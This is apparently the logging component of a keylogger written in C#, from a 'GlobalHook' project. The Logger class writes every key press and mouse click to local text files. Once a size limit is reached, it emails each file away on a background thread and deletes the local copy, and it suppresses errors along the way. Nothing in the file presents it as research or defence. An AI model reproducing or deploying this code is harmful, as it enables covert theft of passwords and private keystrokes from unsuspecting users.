using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace GlobalHook
{
    class Logger
    {
        private readonly SettingAdapter _adapter;
        private readonly EmailSender _sender;
        private bool _isKeysLogSending;
        private bool _isMouseLogSending;
        private string _keysLogFileName = "keyslog.txt";
        private string _mouseLogFileName = "mouselog.txt";

        public Logger(SettingAdapter adapter)
        {
            _sender = new EmailSender(adapter);
            _adapter = adapter;
        }

        public void LogMouse(int x, int y, string button, bool isDown)
        {
            var type = isDown ? "Pressed" : "Released";
            var res = $"{DateTime.Now:G}\t {type} {button} at x={x} y={y}";
            if (_isMouseLogSending) return;
            WriteLog(ref _mouseLogFileName, res);
            if (new FileInfo(_mouseLogFileName).Length / 1024 < _adapter.MaxSize) return;

            ExecAsync(SendAndClearMouseLog);
        }

        private void SendAndClearMouseLog()
        {
            if (_isKeysLogSending) return;
            _isMouseLogSending = true;
            _sender.SendMouseLog(_mouseLogFileName);
            DeleteLog(_mouseLogFileName);
            _isMouseLogSending = false;
        }

        public void LogKey(string key, bool isDown)
        {
            var type = isDown ? "Pressed" : "Released";
            var res = $"{DateTime.Now:G}\t {type} {key}";
            if (_isKeysLogSending) return;
            WriteLog(ref _keysLogFileName, res);
            if (new FileInfo(_keysLogFileName).Length / 1024 < _adapter.MaxSize) return;

            ExecAsync(SendAndClearKeyLog);
        }

        private void SendAndClearKeyLog()
        {
            if (_isMouseLogSending) return;
            _isKeysLogSending = true;
            _sender.SendKeysLog(_keysLogFileName);
            DeleteLog(_keysLogFileName);
            _isKeysLogSending = false;
        }

        private static void ExecAsync(ThreadStart ts)
        {
            new Thread(ts).Start();
        }

        private static void DeleteLog(string path)
        {
            try
            {
                File.Delete(path);
            }
            catch (Exception)
            {
                //ignore
            }
        }

        private static void WriteLog(ref string path, string text)
        {
            try
            {
                using (var sw = File.AppendText(path))
                {
                    sw.WriteLine(text);
                }
            }
            catch (UnauthorizedAccessException)
            {
                path = path.Insert(path.Length - 4, "~");
                WriteLog(ref path, text);
            }
        }
    }
}
